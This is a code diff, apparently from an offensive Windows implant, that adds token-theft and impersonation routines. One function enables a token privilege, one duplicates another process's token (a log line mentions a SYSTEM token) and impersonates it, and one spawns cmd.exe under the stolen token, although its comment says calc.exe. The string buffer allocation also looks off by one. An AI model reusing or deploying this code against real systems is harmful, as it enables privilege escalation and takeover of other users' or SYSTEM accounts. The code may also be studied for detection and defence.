@@ -290,6 +290,39 @@ BOOL EnableAssignPrimaryTokenPrivilege() {
     return TRUE;
 }
 
+BOOL EnableIncreaseQuotaPrivilege() { 
+    HANDLE hToken;
+
+    // Open the process token
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+        return FALSE;
+    }
+
+    LUID luid;
+    // Look up the LUID for the "Increase Quota" privilege
+    if (!LookupPrivilegeValue(NULL, SE_INCREASE_QUOTA_NAME, &luid)) {
+        CloseHandle(hToken);
+        return FALSE;
+    }
+
+    TOKEN_PRIVILEGES tp;
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    // Adjust the token privileges
+    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
+        CloseHandle(hToken);
+        return FALSE;
+    }
+
+    CloseHandle(hToken);
+    
+    // Success
+    return TRUE;
+}
+
+
 char *name(){
     char username[256]; 
     DWORD username_len = sizeof(username);  // Length of the buffer
@@ -335,13 +368,44 @@ HANDLE getPrimaryTokenFromProcess(DWORD processId) {
         CloseHandle(hProcess);
         return NULL;
     }
-
     // Clean up handles
     CloseHandle(hToken);    // Close the original token handle
     CloseHandle(hProcess);  // Close the process handle
 
     return hPrimaryToken; // Return the primary token handle
 }
+
+
+void LaunchProcessAsUser(HANDLE hToken) {
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+
+    // Launch calc.exe
+    if (!CreateProcessAsUser(
+            hToken,                // User's token
+            NULL,                  // No module name (use command line)
+            "C:\\Windows\\System32\\cmd.exe", // Command line
+            NULL,                  // Process security attributes
+            NULL,                  // Primary thread security attributes
+            FALSE,                 // Handle inheritance
+            0,                     // Creation flags
+            NULL,                  // Use parent's environment block
+            NULL,                  // Use parent's starting directory 
+            &si,                   // Pointer to STARTUPINFO structure
+            &pi)                   // Pointer to PROCESS_INFORMATION structure
+    ) {
+        printf("CreateProcessAsUser failed (%d).\n", GetLastError());
+    } else {
+        // Successfully created process
+        printf("Process launched successfully.\n");
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+}
+
 
 char *Impersonate(int pid){
     char *first_user = name();
@@ -350,23 +414,14 @@ char *Impersonate(int pid){
     HANDLE hToken = getPrimaryTokenFromProcess(pid);
     char *open = "[-] Failed to obtain duplicated token.\r\n";
     char *new_user = name();
-    char *enable_assign = "[-] AssignPrimaryToken privilege disabled.\r\n";
-
-    if (EnableAssignPrimaryTokenPrivilege()){
-        enable_assign = "[+] AssignPrimaryToken privilege enabled. \r\n";
-    }
-    
     char *impersonation = "[+] Impersonation successfull.\r\n";
+    
     if (hToken) {
         open = "[+] Obtained duplicated token.\r\n";
-        if (!SetThreadToken(NULL, hToken)) {
-            printf("SetThreadToken failed (Error: %lu)\n", GetLastError());
-            impersonation = "[-] Impersonation unsuccessfull.\r\n";
-        } else {
-            printf("Successfully set SYSTEM token as primary token.\n");
-        }
+        
         // Impersonate the user
         if (!ImpersonateLoggedOnUser(hToken)) {
+            impersonation = "[-] Impersonation unsuccessfull.\r\n";
             CloseHandle(hToken);
         }
 
@@ -375,10 +430,9 @@ char *Impersonate(int pid){
         CloseHandle(hToken);
     }
 
-    char *result = malloc((strlen(first_user) + strlen(open) + strlen(enable_assign) + strlen(new_user) +strlen(impersonation))*sizeof(char) + 2); 
+    char *result = malloc((strlen(first_user) + strlen(open) + strlen(new_user) +strlen(impersonation))*sizeof(char) + 2); 
     strcpy(result, first_user);
     strcat(result, open);
-    strcat(result, enable_assign);
     strcat(result, impersonation);
     strcat(result, new_user);
     return result;
